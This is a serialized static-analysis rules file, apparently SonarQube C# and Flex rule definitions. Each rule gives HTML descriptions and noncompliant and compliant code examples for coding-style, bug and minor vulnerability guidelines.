<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Text   // Noncompliant: Collides with System.Text
  {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  public class MyText
  {
  }
}
</pre>Z
CODE_SMELL
õ
csharpsquid:S1104Ö
csharpsquidS1104+Fields should not have public accessibility"MINOR*cs:ß<p>Public fields in public classes do not respect the encapsulation principle and has three main disadvantages:</p>
<ul>
  <li> Additional behavior such as validation cannot be added. </li>
  <li> The internal representation is exposed, and cannot be changed afterwards. </li>
  <li> Member values are subject to change from anywhere in the code and may not meet the programmer's assumptions. </li>
</ul>
<p>By using private fields and public properties (set and get), unauthorized modifications are prevented. Properties also benefit from additional
protection (security) features such as Link Demands.</p>
<p>Note that due to optimizations on simple properties, public fields provide only very little performance gain.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
    public int instanceData = 32; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
    private int instanceData = 32;

    public int InstanceData
    {
        get { return instanceData; }
	set { instanceData = value ; }
    }
}
</pre>
<h2>Exceptions</h2>
<p>Fields marked as <code>readonly</code> or <code>const</code> are ignored by this rule.</p>
<p>Fields inside classes or structs annotated with the <code>StructLayoutAttribute</code> are ignored by this rule.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/493.html">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier </li>
</ul>ZVULNERABILITY
Ì
csharpsquid:S2674◊
csharpsquidS26748The length returned from a stream read should be checked"MINOR*cs:ˆ
<p>You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method with the number of bytes requested.
Instead, you must check the value returned by the read method to see how many bytes were read. Fail to do so, and you introduce a bug that is both
harmful and difficult to reproduce.</p>
<p>This rule raises an issue when a <code>Stream.Read</code> or a <code>Stream.ReadAsync</code> method is called, but the return value is not
checked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void DoSomething(string fileName)
{
  using (var stream = File.Open(fileName, FileMode.Open))
  {
    var result = new byte[stream.Length];
    stream.Read(result, 0, (int)stream.Length); // Noncompliant
    // ... do something with result
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void DoSomething(string fileName)
{
  using (var stream = File.Open(fileName, FileMode.Open))
  {
    var buffer = new byte[1024];
    using (var ms = new MemoryStream())
    {
        int read;
        while ((read = stream.Read(buffer, 0, buffer.Length)) &gt; 0)
        {
            ms.Write(buffer, 0, read);
        }
        // ... do something with ms
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/XACSAQ">CERT, FIO10-J.</a> - Ensure the array is filled when using read() to fill an
  array </li>
</ul>ZBUG
¨
csharpsquid:S3887ñ
csharpsquidS38874Mutable, non-private fields should not be "readonly""MINOR*cs:π<p>Using the <code>readonly</code> keyword on a field means that it can't be changed after initialization. However, when applied to collections or
arrays, that's only partly true. <code>readonly</code> enforces that another instance can't be assigned to the field, but it cannot keep the contents
from being updated. That means that in practice, the field value really can be changed, and the use of <code>readonly</code> on such a field is
misleading, and you're likely to not be getting the behavior you expect.</p>
<p>This rule raises an issue when a non-private, <code>readonly</code> field is an array or collection.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  public readonly string[] strings;  // Noncompliant

  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
  public string[] strings;

  // ...
</pre>
<p>or</p>
<pre>
public class MyClass
{
  private readonly string[] strings;

  // ...
</pre>ZBUG
Ú
csharpsquid:S3400‹
csharpsquidS3400#Methods should not return constants"MINOR*cs:â<p>There's no point in forcing the overhead of a method call for a method that always returns the same constant value. Even worse, the fact that a
method call must be made will likely mislead developers who call the method thinking that something more is done. Declare a constant instead. </p>
<p>This rule raises an issue if on methods that contain only one statement: the <code>return</code> of a constant value. </p>
<h2>Noncompliant Code Example</h2>
<pre>
int GetBestNumber()
{
  return 12;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
const int BestNumber = 12;
</pre>
<p>or</p>
<pre>
static readonly int BestNumber = 12;
</pre>Z
CODE_SMELL
À
csharpsquid:S4058µ
csharpsquidS4058<Overloads with a "StringComparison" parameter should be used"MINOR*cs:…<p>Many string operations, the <code>Compare</code> and <code>Equals</code> methods in particular, provide an overload that accepts a
<code>StringComparison</code> enumeration value as a parameter. Calling these overloads and explicitly providing this parameter makes your code
clearer and easier to maintain.</p>
<p>This rule raises an issue when a string comparison operation doesn't use the overload that takes a <code>StringComparison</code> parameter.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    public bool HaveSameNames(string name1, string name2)
    {
      return string.Compare(name1, name2) == 0; // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
  public class Foo
  {
    public bool HaveSameNames(string name1, string name2)
    {
      return string.Compare(name1, name2, StringComparison.OrdinalIgnoreCase) == 0;
    }
  }
}
</pre>Z
CODE_SMELL
ˇ
csharpsquid:S4056È
csharpsquidS4056OOverloads with a "CultureInfo" or an "IFormatProvider" parameter should be used"MINOR*cs:Í<p>When a <code>System.Globalization.CultureInfo</code> or <code>IFormatProvider</code> object is not supplied, the default value that is supplied by
the overloaded member might not have the effect that you want in all locales.</p>
<p>You should supply culture-specific information according to the following guidelines:</p>
<ul>
  <li> If the value will be displayed to the user, use the current culture. See <code>CultureInfo.CurrentCulture</code>. </li>
  <li> If the value will be stored and accessed by software (persisted to a file or database), use the invariant culture. See
  <code>CultureInfo.InvariantCulture</code>. </li>
  <li> If you do not know the destination of the value, have the data consumer or provider specify the culture. </li>
</ul>
<p>This rule raises an issue when a method or constructor calls one or more members that have overloads that accept a
<code>System.IFormatProvider</code> parameter, and the method or constructor does not call the overload that takes the <code>IFormatProvider</code>
parameter. This rule ignores calls to .NET Framework methods that are documented as ignoring the <code>IFormatProvider</code> parameter as well as the
following methods:</p>
<ul>
  <li> <code>Activator.CreateInstance</code> </li>
  <li> <code>ResourceManager.GetObject</code> </li>
  <li> <code>ResourceManager.GetString</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        public void Bar(String string1)
        {
            if(string.Compare(string1, string2, false) == 0) // Noncompliant
            {
                Console.WriteLine(string3.ToLower()); // Noncompliant
            }
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Globalization;

namespace MyLibrary
{
    public class Foo
    {
        public void Bar(String string1, String string2, String string3)
        {
            if(string.Compare(string1, string2, false,
                              CultureInfo.InvariantCulture) == 0)
            {
                Console.WriteLine(string3.ToLower(CultureInfo.CurrentCulture));
            }
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when the overload is marked as obsolete.</p>Z
CODE_SMELL
˘
csharpsquid:S1109„
csharpsquidS1109@A close curly brace should be located at the beginning of a line"MINOR*cs:Û<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>Z
CODE_SMELL
≈
csharpsquid:S1227Ø
csharpsquidS1227;break statements should not be used except for switch cases"MINOR*cs:ƒ<p><code>break;</code> is an unstructured control flow statement which makes code harder to read.</p>
<p>Ideally, every loop should have a single termination condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 0;
while (true)
{
  if (i == 10)
  {
    break;      // Non-Compliant
  }

  Console.WriteLine(i);
  i++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int i = 0;
while (i != 10) // Compliant
{
  Console.WriteLine(i);
  i++;
}
</pre>Z
CODE_SMELL
œ
csharpsquid:S1226π
csharpsquidS1226`Method parameters, caught exceptions and foreach variables' initial values should not be ignored"MINOR*cs:∞<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.
Instead, initial values of parameters, caught exceptions, and foreach parameters should be, if not treated as <code>final</code>, then at least read
before reassignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void DoTheThing(string str, int i, List&lt;string&gt; strings)
{
  str = i.ToString(i);  // Noncompliant

  foreach (var s in strings)
  {
    s = "hello world";  // Noncompliant
  }
}
</pre>ZBUG
ã
csharpsquid:S4052ı

csharpsquidS4052+Types should not extend outdated base types"MINOR*cs:ö
<p>With the advent of .NET framework version 2, certain practices have become obsolete.</p>
<p>In particular, exceptions should now extend <code>System.Exception</code> instead of <code>System.ApplicationException</code>. Similarly, generic
collections should be used instead of the older, non-generic, ones. Finally when creating an XML view, you should not extend
<code>System.Xml.XmlDocument</code>.</p>
<p>This rule raises an issue when an externally visible type extends one of these types:</p>
<ul>
  <li> <code>System.ApplicationException</code> </li>
  <li> <code>System.Xml.XmlDocument</code> </li>
  <li> <code>System.Collections.CollectionBase</code> </li>
  <li> <code>System.Collections.DictionaryBase</code> </li>
  <li> <code>System.Collections.Queue</code> </li>
  <li> <code>System.Collections.ReadOnlyCollectionBase</code> </li>
  <li> <code>System.Collections.SortedList</code> </li>
  <li> <code>System.Collections.Stack</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using System.Collections;

namespace MyLibrary
{
  public class MyCollection : CollectionBase  // Noncompliant
  {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Collections;

namespace MyLibrary
{
  public class MyCollection : Collection&lt;T&gt;
  {
  }
}
</pre>Z
CODE_SMELL
ü
csharpsquid:S4027â
csharpsquidS4027/Exceptions should provide standard constructors"MINOR*cs:™
<p>Exceptions types should provide the following constructors:</p>
<ul>
  <li> <code>public MyException()</code> </li>
  <li> <code>public MyException(string)</code> </li>
  <li> <code>public MyException(string, Exception)</code> </li>
  <li> <code>protected</code> or <code>private MyException(SerializationInfo, StreamingContext)</code> </li>
</ul>
<p>That fourth constructor should be <code>protected</code> in unsealed classes, and <code>private</code> in sealed classes.</p>
<p>Not having this full set of constructors can make it difficult to handle exceptions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
  public class MyException // Noncompliant: several constructors are missing
  {
    public MyException()
    {
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using System.Runtime.Serialization;

namespace MyLibrary
{
  public class MyException : Exception
  {
      public MyException()
      {
      }

      public MyException(string message)
          :base(message)
      {
      }

      public MyException(string message, Exception innerException)
          : base(message, innerException)
      {
      }

      protected MyException(SerializationInfo info, StreamingContext context)
          : base(info, context)
      {
      }
  }
}
</pre>Z
CODE_SMELL
©
csharpsquid:S2760ì
csharpsquidS27604Sequential tests should not check the same condition"MINOR*cs:Ø<p>When the same condition is checked twice in a row, it is either confusing - why have separate checks? - or an error - some other condition should
have been checked in the second test.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a == b)
{
  doTheThing(b);
}
if (a == b) // Noncompliant; is this really what was intended?
{
  doTheThing(c);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a == b)
{
  doTheThing(b);
  doTheThing(c);
}
</pre>
<p>or</p>
<pre>
if (a == b)
{
  doTheThing(b);
}
if (b == c)
{
  doTheThing(c);
}
</pre>
<h2>Exceptions</h2>
<p>Since it is a common pattern to test a variable, reassign it if it fails the test, then re-test it, that pattern is ignored.</p>Z
CODE_SMELL
ø
csharpsquid:S4026©
csharpsquidS4026DAssemblies should be marked with "NeutralResourcesLanguageAttribute""MINOR*cs:µ<p>It is important to inform the <code>ResourceManager</code> of the language used to display the resources of the neutral culture for an assembly.
This improves lookup performance for the first resource loaded. </p>
<p>This rule raises an issue when an assembly contains a <code>ResX</code>-based resource but does not have the
<code>System.Resources.NeutralResourcesLanguageAttribute</code> applied to it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

public class MyClass // Noncompliant
{
   public static void Main()
   {
      string[] cultures = { "de-DE", "en-us", "fr-FR" };
      Random rnd = new Random();
      int index = rnd.Next(0, cultures.Length);
      Thread.CurrentThread.CurrentUICulture = CultureInfo.CreateSpecificCulture(cultures[index]);

      ResourceManager rm = new ResourceManager("MyResources" ,
                                               typeof(MyClass).Assembly);
      string greeting = rm.GetString("Greeting");

      Console.Write("Enter your name: ");
      string name = Console.ReadLine();
      Console.WriteLine("{0} {1}!", greeting, name);
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

[assembly:NeutralResourcesLanguageAttribute("en")]
public class MyClass
{
   public static void Main()
   {
      string[] cultures = { "de-DE", "en-us", "fr-FR" };
      Random rnd = new Random();
      int index = rnd.Next(0, cultures.Length);
      Thread.CurrentThread.CurrentUICulture = CultureInfo.CreateSpecificCulture(cultures[index]);

      ResourceManager rm = new ResourceManager("MyResources" ,
                                               typeof(MyClass).Assembly);
      string greeting = rm.GetString("Greeting");

      Console.Write("Enter your name: ");
      string name = Console.ReadLine();
      Console.WriteLine("{0} {1}!", greeting, name);
   }
}
</pre>Z
CODE_SMELL
ö
csharpsquid:S4023Ñ
csharpsquidS4023Interfaces should not be empty"MINOR*cs:∂<p>Empty interfaces are usually used as a marker or a way to identify groups of types. The preferred way to achieve this is to use custom
attributes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
   public interface MyInterface // Noncompliant
   {
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
   public interface MyInterface
   {
      void Foo();
   }
}
</pre>Z
CODE_SMELL
ﬂ
csharpsquid:S4022…
csharpsquidS4022(Enumerations should have "Int32" storage"MINOR*cs:Ò<p>By default the storage type of an <code>enum</code> is <code>Int32</code>. In most cases it is not necessary to change this. In particular you will
not achieve any performance gain by using a smaller data type (e.g. <code>Byte</code>) and may limit future uses.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    public enum Visibility : sbyte // Noncompliant
    {
        Visible = 0,
        Invisible = 1,
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
    public enum Visibility
    {
        Visible = 0,
        Invisible = 1,
    }
}
</pre>Z
CODE_SMELL
ˇ

csharpsquid:S4261È

csharpsquidS4261:Methods should be named according to their synchronicities"MINOR*cs:ˇ	<p>According to the Task-based Asynchronous Pattern (TAP), methods returning either a <code>System.Threading.Tasks.Task</code> or a
<code>System.Threading.Tasks.Task&lt;TResult&gt;</code> are considered "asynchronous". Such methods should use the <code>Async</code> suffix.
Conversely methods which do not return such Tasks should not have an "Async" suffix in their names.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;
using  System.Threading.Tasks;

namespace myLibrary
{

  public class Foo
  {
    public Task Read(byte [] buffer, int offset, int count, // Noncompliant
                                CancellationToken cancellationToken)
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;
using  System.Threading.Tasks;

namespace myLibrary
{

  public class Foo
  {
    public Task ReadAsync(byte [] buffer, int offset, int count, CancellationToken cancellationToken)
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the method is an override or part of the implementation of an interface since it can not be renamed.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/asynchronous-programming-patterns/task-based-asynchronous-pattern-tap">Task-based
  Asynchronous Pattern</a> </li>
</ul>Z
CODE_SMELL
∏
csharpsquid:S3052¢
csharpsquidS30523Members should not be initialized to default values"MINOR*cs:ø<p>The compiler automatically initializes class fields, auto-properties and events to their default values before setting them with any initialization
values, so there is no need to explicitly set a member to its default value. Further, under the logic that cleaner code is better code, it's
considered poor style to do so.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class X
{
  public int field = 0; // Noncompliant
  public object o = null; // Noncompliant
  public object MyProperty { get; set; } = null; // Noncompliant
  public event EventHandler MyEvent = null;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class X
{
  public int field;
  public object o;
  public object MyProperty { get; set; }
  public event EventHandler MyEvent;
}
</pre>
<h2>Exceptions</h2>
<p><code>const</code> fields are ignored.</p>Z
CODE_SMELL
Û
csharpsquid:S4158›
csharpsquidS41584Empty collections should not be accessed or iterated"MINOR*cs:Ä<p>When a collection is empty it makes no sense to access or iterate it. Doing so anyway is surely an error; either population was accidentally
omitted or the developer doesn't understand the situation.</p>
<p>This rule raises an issue when any use is made of an empty collection other than the following ignored calls: <code>Add</code>,
<code>AddRange</code>, <code>Equals</code>, <code>GetHashCode</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var strings = new List&lt;string&gt;();

strings.Remove("bar");  // Noncompliant

if (strings.Contains("foo")) {}  // Noncompliant

foreach (var str in strings) {}  // Noncompliant
</pre>ZBUG
§
csharpsquid:S1449é
csharpsquidS14493Culture should be specified for "string" operations"MINOR*cs:´<p><code>string.ToLower()</code>, <code>ToUpper</code>, <code>IndexOf</code>, <code>LastIndexOf</code>, and <code>Compare</code> are all
culture-dependent, as are some (floating point number and <code>DateTime</code>-related) calls to <code>ToString</code>. Fortunately, all have
variants which accept an argument specifying the culture or formatter to use. Leave that argument off and the call will use the system default
culture, possibly creating problems with international characters.</p>
<p><code>string.CompareTo()</code> is also culture specific, but has no overload that takes a culture information, so instead it's better to use
<code>CompareOrdinal</code>, or <code>Compare</code> with culture.</p>
<p>Calls without a culture may work fine in the system's "home" environment, but break in ways that are extremely difficult to diagnose for customers
who use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it's time to fix them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var lowered = someString.ToLower(); //Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var lowered = someString.ToLower(CultureInfo.InvariantCulture);
</pre>
<p>or</p>
<pre>
var lowered = someString.ToLowerInvariant();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EwAiAg">CERT, STR02-J.</a> - Specify an appropriate locale when comparing
  locale-dependent data </li>
</ul>Z
CODE_SMELL
®
csharpsquid:S3626í
csharpsquidS3626'Jump statements should not be redundant"MINOR*cs:ª<p>Jump statements, such as <code>return</code>, <code>yield break</code>, <code>goto</code>, and <code>continue</code> let you change the default
flow of program execution, but jump statements that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void Foo()
{
  goto A; // Noncompliant
  A:
  while (condition1)
  {
    if (condition2)
    {
      continue; // Noncompliant
    }
    else
    {
      DoTheThing();
    }
  }
  return; // Noncompliant; this is a void method
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void Foo()
{
  while (condition1)
  {
    if (!condition2)
    {
      DoTheThing();
    }
  }
}
</pre>Z
CODE_SMELL
ﬁ

csharpsquid:S1206»

csharpsquidS1206B"Equals(Object)" and "GetHashCode()" should be overridden in pairs"MINOR*cs:›	<p>There is a contract between <code>Equals(object)</code> and <code>GetHashCode()</code>: If two objects are equal according to the
<code>Equals(object)</code> method, then calling <code>GetHashCode()</code> on each of them must yield the same result. If this is not the case, many
collections won't handle class instances correctly.</p>
<p>In order to comply with the contract, <code>Equals(object)</code> and <code>GetHashCode()</code> should be either both inherited, or both
overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {    // Noncompliant - should also override "hashCode()"

  @Override
  public boolean equals(Object obj) {
    /* ... */
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {    // Compliant

  @Override
  public boolean equals(Object obj) {
    /* ... */
  }

  @Override
  public int hashCode() {
    /* ... */
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/581.html">MITRE, CWE-581</a> - Object Model Violation: Just One of Equals and Hashcode Defined
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EYYbAQ">CERT, MET09-J.</a> - Classes that define an equals() method must also define a
  hashCode() method </li>
</ul>ZBUG
Õ

flex:S1455æ
flexS1455;Package definition should be separate from Class definition"MINOR*flex:ÿ<p>Declaring the package and class together has been deprecated since ActionScript 3. The package definition should be declared outside of the class
definition even if the old syntax is still supported. </p>
<h2>Noncompliant Code Example</h2>
<pre>
class P.A {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
package P {
    class A {...}
}
</pre>Z
CODE_SMELL
Ë

flex:S1170Ÿ
flexS1170jPublic constants and fields initialized at declaration should be "const static" rather than merely "const""MINOR*flex:ƒ<p>Making a public constant just <code>const</code> as opposed to <code>static const</code> leads to duplicating its value for every instance of the
class, uselessly increasing the amount of memory required to execute the application.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Myclass
{
  public const THRESHOLD:int = 3;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Myclass
{
  public static const THRESHOLD:int = 3;
}
</pre>Z
CODE_SMELL
Í

flex:S1301€
flexS13019"switch" statements should have at least 3 "case" clauses"MINOR*flex:˜<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>Z
CODE_SMELL
ñ

flex:S1982á
flexS19829"MovieClip.onEnterFrame" event handler should not be used"MINOR*flex:£<p>The <code>onEnterFrame</code> event handler is continually invoked at the frame rate of the SWF file, regardless of which individual movie frame it
is set for. Having too many <code>onEnterFrame</code> handlers can seriously degrade performance. </p>
<p>If the use of this event handler cannot be avoided entirely, then it should be created as close to its use as possible, and then destroyed as soon
as possible afterward.</p>
<h2>Noncompliant Code Example</h2>
<pre>
movieClip.onEnterFrame = function () {   // Noncompliant
   // ...
}
</pre>Z
CODE_SMELL
Ó

flex:S1784ﬂ
flexS1784/Method visibility should be explicitly declared"MINOR*flex:å<p>Access modifiers define which classes can access properties, variables, methods, and other classes. If an access modifier is not specified, the
access level defaults to <code>internal</code>, which grants access to all classes in the same package. This may be what is intended, but it should be
specified explicitly to avoid confusion.</p>
<p>Available access modifiers are:</p>
<ul>
  <li> <code>internal</code> - access allowed within the same package </li>
  <li> <code>private</code> - access allowed only within the same class </li>
  <li> <code>protected</code> - access allowed to the class and its child classes </li>
  <li> <code>public</code> - unfettered access by all </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function checkResources():Boolean {
  ...
  return true;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function checkResources():Boolean {
  ...
  return true;
}
</pre>ZBUG
¯
	flex:S120Í
flexS1204Package names should comply with a naming convention"MINOR*flex:å<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all package names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z]+(\.[a-z][a-z0-9]*)*$</code>:</p>
<pre>
package org.Example {  // Noncompliant
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
package org.example {
...
}
</pre>Z
CODE_SMELL
ä

flex:S1185˚
flexS1185UOverriding methods should do more than simply call the same method in the super class"MINOR*flex:˚<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading.</p>
<h2>Noncompliant Code Example</h2>
<pre>
override public function doSomething() : void
{
  super.doSomething();
}

override public function isLegal(action:Action) : Boolean
{
  return super.isLegal(action);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
override public function doSomething() : void
{
  super.doSomething();                             // Compliant - not simply forwarding the call
  doSomethingElse();
}

override public function isLegal(action:Action) : Boolean
{
  return super.isLegal(new Action(...));   // Compliant - not simply forwarding the call
}

[Deprecated(replacement="isAuthorized")]
override public function isLegal(action:Action) : Boolean
{
  return super.isLegal(action);   // Compliant as there is a metadata
}
</pre>Z
CODE_SMELL
≤
	flex:S116§
flexS1162Field names should comply with a naming convention"MINOR*flex:»<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[_a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
  public var my_field:int;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
   public var myField:int;
}
</pre>Z
CODE_SMELL
ˇ
	flex:S117Ò
flexS117RLocal variable and function parameter names should comply with a naming convention"MINOR*flex:ı<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[_a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public function doSomething(my_param:int):void
{
  var LOCAL:int;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function doSomething(myParam):void
{
  var local;
  ...
}
</pre>Z
CODE_SMELL
Ò

flex:S1951‚
flexS1951'The "trace" function should not be used"MINOR*flex:ç<p>The <code>trace()</code> function outputs debug statements, which can be read by anyone with a debug version of the Flash player. Because sensitive
information could easily be exposed in this manner, <code>trace()</code> should never appear in production code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
    var val:Number = doCalculation();
    trace("Calculation result: " + val);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
    var val:Number = doCalculation();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
</ul>ZVULNERABILITY
å

flex:S1950˝
flexS19506Cases in a "switch" should not have the same condition"MINOR*flex:£<p>Having multiple cases in a <code>switch</code> with the same condition is confusing at best. At worst, it's a bug that is likely to induce further
bugs as the code is maintained. </p>
<p>If the first case ends with a break, the second case will never be executed, rendering it dead code. Worse there is the risk in this situation that
future maintenance will be done on the dead case, rather than on the one that's actually used.</p>
<p>On the other hand, if the first case does not end with a break, both cases will be executed, but future maintainers may not notice that.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch(i) {
  case 1:
    //...
    break;
  case 5:
    //...
    break;
  case 3:
    //...
    break;
  case 1:  // Noncompliant
    //...
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch(i) {
  case 1:
    //...
    break;
  case 5:
    //...
    break;
  case 3:
    //...
    break;
}
</pre>ZBUG
¬

flex:S1312≥
flexS1312KLoggers should be "private static const" and should share naming convention"MINOR*flex:Ω<p>Loggers should be:</p>
<ul>
  <li> <code>private</code>: not accessible outside of their parent classes. If another class needs to log something, it should instantiate its own
  logger. </li>
  <li> <code>static</code>: not dependent on an instance of a class (an object). When logging something, contextual information can of course be
  provided in the messages but the logger should be created at class level to prevent creating a logger along with each object. </li>
  <li> <code>const</code>: created once and only once per class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>LOG(?:GER)?</code>:</p>
<pre>
public const logger:ILogger = LogUtil.getLogger(MyClass);
</pre>
<h2>Compliant Solution</h2>
<pre>
private static const LOG:ILogger = LogUtil.getLogger(MyClass);
</pre>Z
CODE_SMELL
Á
flex:FunctionSinglePointOfExitƒ
flexFunctionSinglePointOfExitHA function should have a single point of exit at the end of the function"MINOR*flex:Ω<p>This is required by IEC 61508, under good programming style.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function func1() { // Noncompliant - there are two points of exit
  if (false) {
    return;
  }
}

function func2() { // Noncompliant - there are two points of exit
  if (a &gt; 0) {
    return 0;
  }
  return -1;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function func1() {
  return;
}

function func2() {
}

function func3();
</pre>Z
CODE_SMELL
…

flex:S1438∫
flexS1438%Statements should end with semicolons"MINOR*flex:Í<p>In Flex, the semicolon is optional as a statement separator, but omitting semicolons can be confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function fun() {
  return   // Noncompliant
       5   // Noncompliant
}
print(fun());  // prints "undefined", not "5"
</pre>
<h2>Compliant Solution</h2>
<pre>
function fun() {
  return 5;
}
print(fun());
</pre>Z
CODE_SMELL
„

flex:S1116‘
flexS1116"Empty statements should be removed"MINOR*flex:á<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething():void {
  ;                                                       // Noncompliant - was used as a kind of TODO marker
}

function doSomethingElse():void {
  trace("Hello, world!");;                     // Noncompliant - double ;
  ...
  for (var i:int = 0; i &lt; 3; trace(i), i++);       // Noncompliant - Rarely, they are used on purpose as the body of a loop. It is a bad practice to have side-effects outside of the loop body
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething():void {}

function doSomethingElse():void {
  trace("Hello, world!");
  ...
  for (var i:int = 0; i &lt; 3; i++){
    trace(i);
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7gCTAw">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
